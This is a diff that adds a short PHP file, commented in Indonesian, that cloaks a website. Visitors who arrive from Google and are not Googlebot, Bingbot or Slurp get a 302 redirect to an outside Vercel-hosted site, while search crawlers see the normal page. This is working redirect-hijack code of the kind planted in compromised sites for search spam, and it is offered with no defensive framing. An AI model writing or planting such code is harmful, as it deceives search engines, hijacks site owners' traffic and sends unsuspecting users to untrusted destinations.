@@ -1,0 +1,19 @@
+<?php
+// Cek apakah referer berasal dari Google
+if (isset($_SERVER['HTTP_REFERER'])) {
+    $referer = $_SERVER['HTTP_REFERER'];
+    $pattern = '/^https?:\/\/(www\.)?google\.[a-z.]+/i';
+    
+    if (preg_match($pattern, $referer)) {
+        // Cek user agent - redirect jika BUKAN bot Google/Bing/Slurp
+        $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+        $bot_pattern = '/(Googlebot|Bingbot|Slurp)/i';
+        
+        if (!preg_match($bot_pattern, $user_agent)) {
+            // Redirect ke tujuan
+            header('Location: https://mobile-shiowla.vercel.app/', true, 302);
+            exit();
+        }
+    }
+}
+?>
